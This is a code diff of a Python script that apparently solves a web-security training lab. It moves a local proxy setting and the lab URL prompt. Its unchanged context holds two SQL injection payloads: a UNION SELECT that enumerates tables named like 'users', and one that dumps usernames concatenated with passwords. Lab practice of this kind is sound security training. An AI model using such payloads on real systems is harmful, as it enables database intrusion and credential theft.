@@ -8,17 +8,17 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 req = requests.Session()
 
+proxies = {
+    'http':'http://127.0.0.1:8080',
+    'https':'http://127.0.0.1:8080'
+}
+
 admin_username = 'administrator'
 password = ''
 
 poc_payload_for_users_table = "'union+SELECT+null,TABLE_NAME+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_NAME+like+'%25users%25'--"
 payload_to_get_users_with_passwords = "='union+SELECT+null,CONCAT(username,'%23',password)+FROM+users--"
 
-url = input('Enter lab url: ')
-proxies = {
-    'http':'http://127.0.0.1:8080',
-    'https':'http://127.0.0.1:8080'
-}
 
 
 def filter_url():
@@ -56,6 +56,8 @@ def login_as_administrator(username, password):
     print()
     exit(0)
 
+
+url = input('Enter lab url: ')
 
 filter_url()
 
